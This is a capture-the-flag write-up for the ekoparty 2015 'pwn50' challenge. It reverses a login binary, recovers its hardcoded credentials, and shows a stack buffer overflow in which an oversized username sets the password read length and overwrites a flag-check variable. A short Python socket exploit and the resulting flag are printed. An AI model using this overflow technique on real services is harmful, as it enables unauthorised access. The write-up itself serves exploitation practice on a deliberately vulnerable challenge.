[](ctf=ekoparty-pre-ctf-2015)
[](type=pwn)
[](tags=buffer-overflow)

We are given a [zip](../pwn50.zip) file.
Extracting it gives us [flag](../flag) executable.

```bash
$ file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=36d90477a8214ae522b46125cf8296e52a3a2d6c, not stripped

$ ./flag 
User : AAAA
Password : AAAA
```
A quick strings on the file gives

```bash
$ strings flag
.
.
flag.txt
User : 
Password : 
charly
h4ckTH1s
.
.

$ ./flag 
User : charly
Password : h4ckTH1s
Welcome guest!
```
But no flag!!
```objdump
   0x00000000004008d3 <+310>:	lea    rax,[rbp-0xd0]
   0x00000000004008da <+317>:	add    rax,0x4
   0x00000000004008de <+321>:	mov    edx,0x6
   0x00000000004008e3 <+326>:	mov    esi,0x400a23
   0x00000000004008e8 <+331>:	mov    rdi,rax
   0x00000000004008eb <+334>:	call   0x400600 <strncmp@plt>
   0x00000000004008f0 <+339>:	test   eax,eax
   0x00000000004008f2 <+341>:	jne    0x400945 <main+424>
   0x00000000004008f4 <+343>:	lea    rax,[rbp-0xd0]
   0x00000000004008fb <+350>:	add    rax,0x18
   0x00000000004008ff <+354>:	mov    edx,0x8
   0x0000000000400904 <+359>:	mov    esi,0x400a2a
   0x0000000000400909 <+364>:	mov    rdi,rax
   0x000000000040090c <+367>:	call   0x400600 <strncmp@plt>
   0x0000000000400911 <+372>:	test   eax,eax
   0x0000000000400913 <+374>:	jne    0x400945 <main+424>
   0x0000000000400915 <+376>:	mov    edi,0x400a33
   0x000000000040091a <+381>:	call   0x400610 <puts@plt>
   0x000000000040091f <+386>:	mov    eax,DWORD PTR [rbp-0xa8]
   0x0000000000400925 <+392>:	cmp    eax,0x1
```
We see there is an additional check involving $rbp-0xa8 to get the flag.
```objdump
   0x000000000040083d <+160>:	mov    DWORD PTR [rbp-0xd0],0x11
   0x0000000000400847 <+170>:	mov    DWORD PTR [rbp-0xbc],0x10
   0x0000000000400851 <+180>:	mov    DWORD PTR [rbp-0xa8],0x0
   0x000000000040085b <+190>:	mov    edi,0x400a0f
   0x0000000000400860 <+195>:	mov    eax,0x0
   0x0000000000400865 <+200>:	call   0x400640 <printf@plt>
   0x000000000040086a <+205>:	mov    edi,0x0
   0x000000000040086f <+210>:	call   0x400690 <fflush@plt>
   0x0000000000400874 <+215>:	mov    eax,DWORD PTR [rbp-0xd0]
   0x000000000040087a <+221>:	cdqe   
   0x000000000040087c <+223>:	lea    rdx,[rbp-0xd0]
   0x0000000000400883 <+230>:	lea    rcx,[rdx+0x4]
   0x0000000000400887 <+234>:	mov    rdx,rax
   0x000000000040088a <+237>:	mov    rsi,rcx
   0x000000000040088d <+240>:	mov    edi,0x0
   0x0000000000400892 <+245>:	call   0x400650 <read@plt>
   0x0000000000400897 <+250>:	mov    edi,0x400a17
   0x000000000040089c <+255>:	mov    eax,0x0
   0x00000000004008a1 <+260>:	call   0x400640 <printf@plt>
   0x00000000004008a6 <+265>:	mov    edi,0x0
   0x00000000004008ab <+270>:	call   0x400690 <fflush@plt>
   0x00000000004008b0 <+275>:	mov    eax,DWORD PTR [rbp-0xbc]
   0x00000000004008b6 <+281>:	cdqe   
   0x00000000004008b8 <+283>:	lea    rdx,[rbp-0xd0]
   0x00000000004008bf <+290>:	lea    rcx,[rdx+0x18]
   0x00000000004008c3 <+294>:	mov    rdx,rax
   0x00000000004008c6 <+297>:	mov    rsi,rcx
   0x00000000004008c9 <+300>:	mov    edi,0x0
   0x00000000004008ce <+305>:	call   0x400650 <read@plt>
```
The read for username is called with 0x11 length and password with 0x10.
However when we give the username as 'A'*17 for second read
```bash
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fffffffe158 --> 0x0 
arg[2]: 0x41 ('A')
arg[3]: 0x7fffffffe158 --> 0x0 
```
This means we can control the length of input for password using the input from username.
Also strncmp for username is called with 6 length and password with 8. This helps us so that we can pad the username and password with anything.
After a little hit and trial we figure out the distance between password buffer and $rbp-0xa8 is 16

```python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challs.ctf.site',20000))
s.recv(1024)
s.send('charlyAAAAAAAAAAA')
s.recv(1024)
s.send('h4ckTH1sAAAAAAAA\x01\x00')
print s.recv(1024)
```
gives us 

Welcome guest!
Your flag is : EKO{Back_to_r00000ooooo00000tS}

Flag
> EKO{Back_to_r00000ooooo00000tS}